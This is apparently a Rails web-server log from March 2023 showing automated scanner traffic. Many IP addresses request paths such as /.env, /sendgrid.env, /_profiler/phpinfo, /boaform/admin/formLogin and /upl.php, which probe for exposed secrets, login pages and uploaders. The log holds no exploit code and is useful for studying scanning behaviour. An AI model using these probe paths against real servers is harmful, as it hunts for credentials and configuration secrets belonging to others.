I, [2023-03-09T16:28:16.286231 #2274955]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T16:28:16.286883 #2274955]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-09T16:28:16.287048 #2274955]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 512)
I, [2023-03-09T16:33:32.883270 #2274955]  INFO -- : Started GET "/.env" for 135.125.217.54 at 2023-03-09 16:33:32 +0900
I, [2023-03-09T16:33:32.883942 #2274955]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T16:33:32.883987 #2274955]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-03-09T16:33:32.884555 #2274955]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T16:33:32.885282 #2274955]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-03-09T16:33:32.885468 #2274955]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 521)
I, [2023-03-09T16:33:33.411060 #2274955]  INFO -- : Started POST "/" for 135.125.217.54 at 2023-03-09 16:33:33 +0900
F, [2023-03-09T16:33:33.411407 #2274955] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-03-09T16:38:22.977803 #2274953]  INFO -- : Started GET "/.env" for 185.254.196.115 at 2023-03-09 16:38:22 +0900
I, [2023-03-09T16:38:22.978405 #2274953]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T16:38:22.978443 #2274953]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-03-09T16:38:22.978853 #2274953]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T16:38:22.979661 #2274953]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-03-09T16:38:22.979891 #2274953]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 521)
I, [2023-03-09T16:38:24.179660 #2274955]  INFO -- : Started POST "/" for 185.254.196.115 at 2023-03-09 16:38:24 +0900
F, [2023-03-09T16:38:24.180166 #2274955] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-03-09T16:48:14.738179 #2274955]  INFO -- : Started GET "/" for 139.99.9.160 at 2023-03-09 16:48:14 +0900
I, [2023-03-09T16:48:14.738780 #2274955]  INFO -- : Processing by UserController#index as HTML
I, [2023-03-09T16:48:14.739272 #2274955]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.1ms | Allocations: 4)
I, [2023-03-09T16:48:14.740654 #2274955]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.5ms | Allocations: 299)
I, [2023-03-09T16:48:14.740851 #2274955]  INFO -- : Completed 200 OK in 2ms (Views: 1.8ms | Allocations: 514)
I, [2023-03-09T17:26:44.574729 #2274955]  INFO -- : Started HEAD "/Core/Skin/Login.aspx" for 101.32.209.199 at 2023-03-09 17:26:44 +0900
I, [2023-03-09T17:26:44.575358 #2274955]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T17:26:44.575401 #2274955]  INFO -- :   Parameters: {"all"=>"Core/Skin/Login"}
I, [2023-03-09T17:26:44.575843 #2274955]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T17:26:44.581584 #2274955]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 5.8ms | Allocations: 299)
I, [2023-03-09T17:26:44.581804 #2274955]  INFO -- : Completed 200 OK in 6ms (Views: 6.1ms | Allocations: 505)
I, [2023-03-09T17:28:51.917294 #2274955]  INFO -- : Started GET "/aaa9" for 167.71.224.89 at 2023-03-09 17:28:51 +0900
I, [2023-03-09T17:28:51.917927 #2274955]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T17:28:51.917966 #2274955]  INFO -- :   Parameters: {"all"=>"aaa9"}
I, [2023-03-09T17:28:51.918394 #2274955]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T17:28:51.919033 #2274955]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-09T17:28:51.919203 #2274955]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 521)
I, [2023-03-09T17:28:52.142036 #2274953]  INFO -- : Started GET "/aab8" for 167.71.224.89 at 2023-03-09 17:28:52 +0900
I, [2023-03-09T17:28:52.143084 #2274953]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T17:28:52.143138 #2274953]  INFO -- :   Parameters: {"all"=>"aab8"}
I, [2023-03-09T17:28:52.144118 #2274953]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.2ms | Allocations: 4)
I, [2023-03-09T17:28:52.145789 #2274953]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.9ms | Allocations: 299)
I, [2023-03-09T17:28:52.146410 #2274953]  INFO -- : Completed 200 OK in 3ms (Views: 2.9ms | Allocations: 521)
I, [2023-03-09T17:38:28.341739 #2274953]  INFO -- : Started GET "/" for 139.162.84.205 at 2023-03-09 17:38:28 +0900
I, [2023-03-09T17:38:28.342336 #2274953]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T17:38:28.342776 #2274953]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T17:38:28.343415 #2274953]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-09T17:38:28.343604 #2274953]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 521)
I, [2023-03-09T17:55:49.588704 #2274953]  INFO -- : Started GET "/" for 182.253.20.210 at 2023-03-09 17:55:49 +0900
I, [2023-03-09T17:55:49.589435 #2274953]  INFO -- : Processing by UserController#index as HTML
I, [2023-03-09T17:55:49.589862 #2274953]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T17:55:49.590488 #2274953]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-09T17:55:49.590640 #2274953]  INFO -- : Completed 200 OK in 1ms (Views: 0.9ms | Allocations: 514)
I, [2023-03-09T17:55:55.015730 #2274953]  INFO -- : Started GET "/.env" for 95.214.235.205 at 2023-03-09 17:55:55 +0900
I, [2023-03-09T17:55:55.016393 #2274953]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T17:55:55.016773 #2274953]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-03-09T17:55:55.017476 #2274953]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T17:55:55.018353 #2274953]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.9ms | Allocations: 298)
I, [2023-03-09T17:55:55.018627 #2274953]  INFO -- : Completed 200 OK in 2ms (Views: 1.5ms | Allocations: 515)
I, [2023-03-09T17:55:55.594875 #2274953]  INFO -- : Started POST "/" for 95.214.235.205 at 2023-03-09 17:55:55 +0900
F, [2023-03-09T17:55:55.595210 #2274953] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-03-09T18:17:43.482279 #2274953]  INFO -- : Started GET "/.env" for 135.125.217.54 at 2023-03-09 18:17:43 +0900
I, [2023-03-09T18:17:43.482968 #2274953]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T18:17:43.483009 #2274953]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-03-09T18:17:43.483518 #2274953]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T18:17:43.484134 #2274953]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-09T18:17:43.484302 #2274953]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 521)
I, [2023-03-09T18:17:44.020719 #2274953]  INFO -- : Started POST "/" for 135.125.217.54 at 2023-03-09 18:17:44 +0900
F, [2023-03-09T18:17:44.021090 #2274953] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-03-09T18:33:53.159542 #2274953]  INFO -- : Started GET "/_profiler/phpinfo" for 18.203.161.192 at 2023-03-09 18:33:53 +0900
I, [2023-03-09T18:33:53.160143 #2274953]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T18:33:53.160182 #2274953]  INFO -- :   Parameters: {"all"=>"_profiler/phpinfo"}
I, [2023-03-09T18:33:53.160597 #2274953]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T18:33:53.161247 #2274953]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-09T18:33:53.161497 #2274953]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 521)
I, [2023-03-09T18:33:53.750317 #2274955]  INFO -- : Started GET "/yuuki?pp=env" for 18.203.161.192 at 2023-03-09 18:33:53 +0900
I, [2023-03-09T18:33:53.750984 #2274955]  INFO -- : Processing by UserController#index as HTML
I, [2023-03-09T18:33:53.751024 #2274955]  INFO -- :   Parameters: {"pp"=>"env", "all"=>"yuuki"}
I, [2023-03-09T18:33:53.753371 #2274955]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T18:33:53.754062 #2274955]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-09T18:33:53.754256 #2274955]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 513)
I, [2023-03-09T18:33:54.214130 #2274955]  INFO -- : Started GET "/.env" for 18.203.161.192 at 2023-03-09 18:33:54 +0900
I, [2023-03-09T18:33:54.214741 #2274955]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T18:33:54.214782 #2274955]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-03-09T18:33:54.215554 #2274955]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T18:33:54.216203 #2274955]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 298)
I, [2023-03-09T18:33:54.216396 #2274955]  INFO -- : Completed 200 OK in 2ms (Views: 1.3ms | Allocations: 515)
I, [2023-03-09T18:33:55.162708 #2274953]  INFO -- : Started POST "/" for 18.203.161.192 at 2023-03-09 18:33:55 +0900
F, [2023-03-09T18:33:55.163049 #2274953] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-03-09T18:44:30.235579 #2274953]  INFO -- : Started HEAD "/Core/Skin/Login.aspx" for 101.32.209.199 at 2023-03-09 18:44:30 +0900
I, [2023-03-09T18:44:30.236185 #2274953]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T18:44:30.236226 #2274953]  INFO -- :   Parameters: {"all"=>"Core/Skin/Login"}
I, [2023-03-09T18:44:30.236638 #2274953]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T18:44:30.237327 #2274953]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-09T18:44:30.237480 #2274953]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 505)
I, [2023-03-09T19:24:20.848509 #2274953]  INFO -- : Started GET "/.env" for 135.125.217.54 at 2023-03-09 19:24:20 +0900
I, [2023-03-09T19:24:20.849211 #2274953]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T19:24:20.849256 #2274953]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-03-09T19:24:20.849670 #2274953]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T19:24:20.850319 #2274953]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-09T19:24:20.850488 #2274953]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 521)
I, [2023-03-09T19:24:21.398456 #2274955]  INFO -- : Started POST "/" for 135.125.217.54 at 2023-03-09 19:24:21 +0900
F, [2023-03-09T19:24:21.398807 #2274955] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-03-09T19:43:53.940785 #2274955]  INFO -- : Started GET "/.env" for 95.214.235.205 at 2023-03-09 19:43:53 +0900
I, [2023-03-09T19:43:53.941670 #2274955]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T19:43:53.941718 #2274955]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-03-09T19:43:53.942257 #2274955]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T19:43:53.942877 #2274955]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-09T19:43:53.943040 #2274955]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 521)
I, [2023-03-09T19:43:54.657290 #2274953]  INFO -- : Started POST "/" for 95.214.235.205 at 2023-03-09 19:43:54 +0900
F, [2023-03-09T19:43:54.657628 #2274953] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-03-09T20:02:01.261028 #2274953]  INFO -- : Started HEAD "/Core/Skin/Login.aspx" for 101.32.209.199 at 2023-03-09 20:02:01 +0900
I, [2023-03-09T20:02:01.261889 #2274953]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T20:02:01.261940 #2274953]  INFO -- :   Parameters: {"all"=>"Core/Skin/Login"}
I, [2023-03-09T20:02:01.262463 #2274953]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T20:02:01.263135 #2274953]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-03-09T20:02:01.263291 #2274953]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 505)
I, [2023-03-09T20:48:19.046294 #2274953]  INFO -- : Started GET "/.env" for 135.125.217.54 at 2023-03-09 20:48:19 +0900
I, [2023-03-09T20:48:19.046916 #2274953]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T20:48:19.046959 #2274953]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-03-09T20:48:19.047476 #2274953]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T20:48:19.048374 #2274953]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.9ms | Allocations: 299)
I, [2023-03-09T20:48:19.049457 #2274953]  INFO -- : Completed 200 OK in 2ms (Views: 1.3ms | Allocations: 521)
I, [2023-03-09T20:48:19.629766 #2274955]  INFO -- : Started POST "/" for 135.125.217.54 at 2023-03-09 20:48:19 +0900
F, [2023-03-09T20:48:19.630146 #2274955] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-03-09T21:18:16.673765 #2274955]  INFO -- : Started GET "/" for 185.180.143.79 at 2023-03-09 21:18:16 +0900
I, [2023-03-09T21:18:16.674347 #2274955]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T21:18:16.674909 #2274955]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T21:18:16.675727 #2274955]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.9ms | Allocations: 299)
I, [2023-03-09T21:18:16.675901 #2274955]  INFO -- : Completed 200 OK in 1ms (Views: 1.2ms | Allocations: 521)
I, [2023-03-09T21:19:44.389236 #2274955]  INFO -- : Started HEAD "/Core/Skin/Login.aspx" for 101.32.209.199 at 2023-03-09 21:19:44 +0900
I, [2023-03-09T21:19:44.390064 #2274955]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T21:19:44.390111 #2274955]  INFO -- :   Parameters: {"all"=>"Core/Skin/Login"}
I, [2023-03-09T21:19:44.390666 #2274955]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T21:19:44.391314 #2274955]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-09T21:19:44.391456 #2274955]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 505)
I, [2023-03-09T21:20:23.823061 #2274955]  INFO -- : Started POST "/boaform/admin/formLogin" for 179.61.251.92 at 2023-03-09 21:20:23 +0900
F, [2023-03-09T21:20:23.823537 #2274955] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/boaform/admin/formLogin"):
  
I, [2023-03-09T21:31:32.093896 #2274955]  INFO -- : Started GET "/sendgrid.env" for 2.57.122.80 at 2023-03-09 21:31:32 +0900
I, [2023-03-09T21:31:32.094489 #2274955]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T21:31:32.094528 #2274955]  INFO -- :   Parameters: {"all"=>"sendgrid"}
I, [2023-03-09T21:31:32.094960 #2274955]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T21:31:32.095597 #2274955]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-09T21:31:32.095748 #2274955]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 514)
I, [2023-03-09T21:31:32.638177 #2274953]  INFO -- : Started GET "/.env" for 2.57.122.80 at 2023-03-09 21:31:32 +0900
I, [2023-03-09T21:31:32.638867 #2274953]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T21:31:32.638916 #2274953]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-03-09T21:31:32.639584 #2274953]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T21:31:32.640339 #2274953]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.0ms | Allocations: 299)
I, [2023-03-09T21:31:32.640511 #2274953]  INFO -- : Completed 200 OK in 2ms (Views: 1.3ms | Allocations: 521)
I, [2023-03-09T21:31:33.185559 #2274955]  INFO -- : Started GET "/.sendgrid" for 2.57.122.80 at 2023-03-09 21:31:33 +0900
I, [2023-03-09T21:31:33.186442 #2274955]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T21:31:33.186545 #2274955]  INFO -- :   Parameters: {"all"=>".sendgrid"}
I, [2023-03-09T21:31:33.187012 #2274955]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T21:31:33.187774 #2274955]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 298)
I, [2023-03-09T21:31:33.188027 #2274955]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 515)
I, [2023-03-09T21:40:10.803811 #2274955]  INFO -- : Started GET "/" for 139.162.84.205 at 2023-03-09 21:40:10 +0900
I, [2023-03-09T21:40:10.804545 #2274955]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T21:40:10.805108 #2274955]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T21:40:10.805834 #2274955]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-03-09T21:40:10.806006 #2274955]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 521)
I, [2023-03-09T22:20:34.102180 #2274955]  INFO -- : Started GET "/" for 159.65.111.248 at 2023-03-09 22:20:34 +0900
I, [2023-03-09T22:20:34.102963 #2274955]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T22:20:34.103456 #2274955]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T22:20:34.104083 #2274955]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-09T22:20:34.104253 #2274955]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 521)
I, [2023-03-09T22:37:33.503098 #2274955]  INFO -- : Started HEAD "/Core/Skin/Login.aspx" for 101.32.209.199 at 2023-03-09 22:37:33 +0900
I, [2023-03-09T22:37:33.503711 #2274955]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T22:37:33.503750 #2274955]  INFO -- :   Parameters: {"all"=>"Core/Skin/Login"}
I, [2023-03-09T22:37:33.504322 #2274955]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T22:37:33.505375 #2274955]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.0ms | Allocations: 299)
I, [2023-03-09T22:37:33.505549 #2274955]  INFO -- : Completed 200 OK in 2ms (Views: 1.4ms | Allocations: 505)
I, [2023-03-09T22:52:08.263087 #2274955]  INFO -- : Started GET "/.env" for 135.125.217.54 at 2023-03-09 22:52:08 +0900
I, [2023-03-09T22:52:08.264028 #2274955]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T22:52:08.264077 #2274955]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-03-09T22:52:08.264511 #2274955]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T22:52:08.265398 #2274955]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.9ms | Allocations: 299)
I, [2023-03-09T22:52:08.265577 #2274955]  INFO -- : Completed 200 OK in 1ms (Views: 1.2ms | Allocations: 521)
I, [2023-03-09T22:52:08.780691 #2274953]  INFO -- : Started POST "/" for 135.125.217.54 at 2023-03-09 22:52:08 +0900
F, [2023-03-09T22:52:08.781342 #2274953] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-03-09T23:21:19.858816 #2274953]  INFO -- : Started GET "/" for 193.118.53.210 at 2023-03-09 23:21:19 +0900
I, [2023-03-09T23:21:19.859404 #2274953]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T23:21:19.860027 #2274953]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T23:21:19.860736 #2274953]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-03-09T23:21:19.860940 #2274953]  INFO -- : Completed 200 OK in 1ms (Views: 1.2ms | Allocations: 521)
I, [2023-03-09T23:29:33.206243 #2274953]  INFO -- : Started GET "/" for 159.89.198.27 at 2023-03-09 23:29:33 +0900
I, [2023-03-09T23:29:33.206915 #2274953]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T23:29:33.207374 #2274953]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T23:29:33.208272 #2274953]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.9ms | Allocations: 299)
I, [2023-03-09T23:29:33.208545 #2274953]  INFO -- : Completed 200 OK in 2ms (Views: 1.2ms | Allocations: 521)
I, [2023-03-09T23:29:33.368427 #2274955]  INFO -- : Started GET "/client/get_targets" for 159.89.198.27 at 2023-03-09 23:29:33 +0900
I, [2023-03-09T23:29:33.369061 #2274955]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T23:29:33.369105 #2274955]  INFO -- :   Parameters: {"all"=>"client/get_targets"}
I, [2023-03-09T23:29:33.369722 #2274955]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T23:29:33.370513 #2274955]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-03-09T23:29:33.370707 #2274955]  INFO -- : Completed 200 OK in 2ms (Views: 1.3ms | Allocations: 521)
I, [2023-03-09T23:29:33.522299 #2274955]  INFO -- : Started GET "/upl.php" for 159.89.198.27 at 2023-03-09 23:29:33 +0900
I, [2023-03-09T23:29:33.522908 #2274955]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T23:29:33.522949 #2274955]  INFO -- :   Parameters: {"all"=>"upl"}
I, [2023-03-09T23:29:33.523991 #2274955]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T23:29:33.524846 #2274955]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.9ms | Allocations: 298)
I, [2023-03-09T23:29:33.525285 #2274955]  INFO -- : Completed 200 OK in 2ms (Views: 2.0ms | Allocations: 507)
I, [2023-03-09T23:47:21.569117 #2274953]  INFO -- : Started GET "/.env" for 95.214.235.205 at 2023-03-09 23:47:21 +0900
I, [2023-03-09T23:47:21.570148 #2274953]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T23:47:21.570194 #2274953]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-03-09T23:47:21.570830 #2274953]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T23:47:21.571458 #2274953]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-09T23:47:21.571635 #2274953]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 521)
I, [2023-03-09T23:47:22.505551 #2274955]  INFO -- : Started POST "/" for 95.214.235.205 at 2023-03-09 23:47:22 +0900
F, [2023-03-09T23:47:22.505896 #2274955] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-03-09T23:55:53.622940 #2274955]  INFO -- : Started HEAD "/Core/Skin/Login.aspx" for 101.32.209.199 at 2023-03-09 23:55:53 +0900
I, [2023-03-09T23:55:53.623526 #2274955]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T23:55:53.623565 #2274955]  INFO -- :   Parameters: {"all"=>"Core/Skin/Login"}
I, [2023-03-09T23:55:53.623974 #2274955]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T23:55:53.624589 #2274955]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-09T23:55:53.625131 #2274955]  INFO -- : Completed 200 OK in 2ms (Views: 1.3ms | Allocations: 505)
